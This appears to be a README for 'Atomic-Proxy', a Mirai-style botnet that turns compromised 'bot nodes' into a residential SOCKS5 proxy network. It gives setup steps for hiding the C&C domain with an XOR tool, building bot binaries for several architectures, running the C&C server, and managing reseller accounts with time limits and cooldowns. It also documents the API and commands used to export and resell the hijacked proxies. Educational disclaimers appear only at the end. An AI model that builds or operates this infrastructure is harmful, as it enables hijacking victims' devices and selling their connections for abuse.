# Atomic-Proxy Network Guide

## Introduction

Atomic-Proxy is a distributed residential proxy network system. This guide covers the complete setup, configuration, and usage of the system.

## System Architecture

### Components

1. **Bot Nodes** - Devices running SOCKS5 proxy servers
2. **C&C Server** - Central management and control
3. **API Server** - RESTful interface for proxy access
4. **Admin Panel** - Terminal-based administration
5. **Database** - SQLite for user and statistics storage

### Communication Flow

```
Client Request → API Server → C&C Server → Bot Node → Target Server
                     ↓                          ↓
                 Authentication            SOCKS5 Proxy
                     ↓                          ↓
                 User Database            Data Relay
```

## Installation

### 1. Install Dependencies

```bash
sudo apt-get update
sudo apt-get install gcc g++ sqlite3 golang-1.20 -y
```

### 2. Configure Domain/IP

Use the XOR tool to obfuscate your C&C domain:

```bash
cd tools
gcc xor.c -o xor
./xor string your-domain.com
```

Add the output to `bot/table.c`:

```c
add_entry(TABLE_CNC_DOMAIN, "\xAB\xCD\xEF...", length);
```

### 3. Build Bot Nodes

```bash
chmod +x build.sh
./build.sh
```

This creates binaries for multiple architectures in the `release/` directory.

### 4. Configure Database

```bash
sqlite3 assets/data.sql

CREATE TABLE `users` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `username` TEXT NOT NULL,
  `password` TEXT NOT NULL,
  `admin` INTEGER NOT NULL,
  `reseller` INTEGER NOT NULL,
  `newuser` INTEGER NOT NULL,
  `api` INTEGER NOT NULL,
  `maxtime` INTEGER NOT NULL,
  `cooldown` INTEGER NOT NULL,
  `conns` INTEGER NOT NULL,
  `max_daily` INTEGER NOT NULL,
  `expiry` INTEGER NOT NULL
);

INSERT INTO users VALUES(1,'admin','admin123',1,1,0,1,864000,0,10,1000,2147483647);
```

### 5. Configure Server

Edit `assets/server.toml`:

```toml
[templates.server]
protocol = "tcp"
listener = ":666"

[templates.slaves]
protocol = "tcp"
listener = ":1995"

[templates.api]
listener = "0.0.0.0:81"
tls = false
```

### 6. Build and Run C&C

```bash
cd cnc
go build
./cnc
```

## Usage

### Admin Panel

Connect to the admin panel:

```bash
telnet your-server.com 666
```

Login with your credentials.

### Proxy Management Commands

#### Start Proxy Network

```
proxy start port=1080 auth=false maxconns=50
```

Parameters:
- `port` - SOCKS5 listening port (default: 1080)
- `auth` - Enable authentication (default: false)
- `maxconns` - Max connections per node (default: 50)

#### Stop All Proxies

```
proxy stop
```

#### List Active Proxies

```
proxy list
```

Shows:
- IP address
- Port
- Country
- Active connections
- Status

#### View Statistics

```
proxy stats
```

Displays:
- Total proxies
- Online proxies
- Active connections
- Data transferred

#### Export Proxy List

```
proxy export
```

Outputs all proxies in `ip:port` format.

### API Usage

#### Authentication

All API requests require authentication:

```
?user=username&password=password
```

#### Get Proxy List (JSON)

```bash
curl "http://server:81/proxies?user=admin&password=admin123"
```

Response:
```json
{
  "success": true,
  "count": 150,
  "proxies": [
    {
      "ip": "192.168.1.100",
      "port": 1080,
      "country": "Unknown",
      "city": "Unknown",
      "status": "running",
      "connections_active": 5,
      "bytes_sent": 1048576,
      "bytes_received": 2097152
    }
  ]
}
```

#### Start Proxies

```bash
curl "http://server:81/proxy/start?user=admin&password=admin123&port=1080&auth=false"
```

#### Stop Proxies

```bash
curl "http://server:81/proxy/stop?user=admin&password=admin123"
```

#### Get Statistics

```bash
curl "http://server:81/proxy/stats?user=admin&password=admin123"
```

#### Export Proxy List (Text)

```bash
# Format: ip:port
curl "http://server:81/proxy/list?user=admin&password=admin123&format=ip:port"

# Format: ip:port:user:pass
curl "http://server:81/proxy/list?user=admin&password=admin123&format=ip:port:user:pass"
```

### Using Proxies

#### With curl

```bash
curl -x socks5://192.168.1.100:1080 https://api.ipify.org
```

#### With Python

```python
import requests

proxies = {
    'http': 'socks5://192.168.1.100:1080',
    'https': 'socks5://192.168.1.100:1080'
}

response = requests.get('https://api.ipify.org', proxies=proxies)
print(response.text)
```

#### With Browser (Firefox)

1. Preferences → Network Settings
2. Manual proxy configuration
3. SOCKS Host: 192.168.1.100
4. Port: 1080
5. SOCKS v5

## User Management

### Create User

```
create username password 30
```

Creates a user with 30 days access.

### Modify User Permissions

```
admin true username    # Grant admin access
api true username      # Grant API access
reseller true username # Grant reseller access
```

### Modify User Limits

```
maxtime 3600 username     # Max time in seconds
cooldown 60 username      # Cooldown between uses
conns 5 username          # Concurrent connections
max_daily 100 username    # Max daily operations
days 30 username          # Extend by 30 days
```

### Remove User

```
remove username
```

## Monitoring

### View Connected Nodes

```
bots
```

Shows total nodes and breakdown by source.

### View Active Sessions

```
sessions
```

Shows all logged-in admin users.

### View All Users

```
users
```

Displays user database with permissions.

## Security Best Practices

1. **Change Default Credentials**
   - Immediately change admin password
   - Use strong passwords

2. **Enable Authentication**
   - Use `auth=true` when starting proxies
   - Implement user/pass authentication

3. **Firewall Configuration**
   ```bash
   # Allow only specific IPs to admin panel
   iptables -A INPUT -p tcp --dport 666 -s YOUR_IP -j ACCEPT
   iptables -A INPUT -p tcp --dport 666 -j DROP
   ```

4. **TLS/SSL**
   - Enable TLS for API in `server.toml`
   - Generate certificates:
   ```bash
   openssl req -x509 -newkey rsa:4096 -keyout api.key -out api.cert -days 365 -nodes
   ```

5. **Rate Limiting**
   - Implement rate limiting on API endpoints
   - Monitor for abuse

6. **Logging**
   - Enable comprehensive logging
   - Monitor for suspicious activity

## Troubleshooting

### Bots Not Connecting

1. Check C&C domain configuration
2. Verify firewall allows port 1995
3. Check bot logs (if DEBUG enabled)
4. Verify network connectivity

### Proxies Not Starting

1. Check if port is already in use
2. Verify bot has permissions to bind port
3. Check for firewall blocking proxy port
4. Review C&C server logs

### API Not Responding

1. Verify API server is running
2. Check port 81 is accessible
3. Verify authentication credentials
4. Check server.toml configuration

### Performance Issues

1. Reduce `maxconns` per node
2. Implement bandwidth limiting
3. Monitor system resources
4. Scale horizontally (more nodes)

## Advanced Configuration

### Geographic Distribution

To track proxy locations, integrate a GeoIP database:

```go
// In proxies.go
func UpdateProxyGeoInfo(proxy *Proxy, ip string) {
    // Integrate MaxMind GeoIP2 or similar
    db, _ := geoip2.Open("GeoLite2-City.mmdb")
    defer db.Close()
    
    ipAddr := net.ParseIP(ip)
    record, _ := db.City(ipAddr)
    
    proxy.Country = record.Country.Names["en"]
    proxy.City = record.City.Names["en"]
}
```

### Load Balancing

Implement round-robin or least-connections:

```go
func GetNextProxy() *Proxy {
    proxies := proxyPool.GetOnlineProxies()
    
    // Find proxy with least active connections
    var best *Proxy
    minConns := uint32(^uint32(0))
    
    for _, p := range proxies {
        if p.Stats.ConnectionsActive < minConns {
            minConns = p.Stats.ConnectionsActive
            best = p
        }
    }
    
    return best
}
```

### Bandwidth Limiting

Implement per-connection throttling in `proxy.c`:

```c
void proxy_forward_data(int src_fd, int dst_fd, uint64_t *byte_counter) {
    uint8_t buffer[PROXY_BUFFER_SIZE];
    
    int n = recv(src_fd, buffer, PROXY_BUFFER_SIZE, 0);
    if (n <= 0) return;
    
    // Check bandwidth limit
    if (proxy_server.bandwidth_limit > 0) {
        usleep(n * 8 / proxy_server.bandwidth_limit); // Throttle
    }
    
    send(dst_fd, buffer, n, 0);
    *byte_counter += n;
}
```

## Performance Optimization

### Bot Node

1. Increase file descriptor limit:
   ```bash
   ulimit -n 65535
   ```

2. Optimize TCP settings:
   ```bash
   sysctl -w net.ipv4.tcp_fin_timeout=15
   sysctl -w net.ipv4.tcp_tw_reuse=1
   ```

### C&C Server

1. Enable Go performance profiling
2. Use connection pooling
3. Implement caching for frequently accessed data
4. Use goroutine pools to limit concurrency

## Legal and Ethical Considerations

**IMPORTANT**: This system is for educational purposes only.

### Legal Requirements

1. **Authorization**: Only deploy on systems you own or have explicit permission to use
2. **Privacy**: Respect user privacy and data protection laws
3. **Terms of Service**: Don't violate ISP or service ToS
4. **Transparency**: If deployed legitimately, inform users
5. **Compliance**: Follow GDPR, CCPA, and other regulations

### Ethical Use

1. Never use for malicious purposes
2. Implement opt-in consent mechanisms
3. Provide clear privacy policies
4. Allow users to opt-out easily
5. Secure user data properly

## Contributing

This is an educational project. Contributions should focus on:
- Security improvements
- Documentation
- Performance optimization
- Educational value

## License

Educational use only. See LICENSE file for details.

## Support

For questions about legitimate educational use, open an issue on GitHub.

**Remember**: Unauthorized access to computer systems is illegal. Use responsibly.
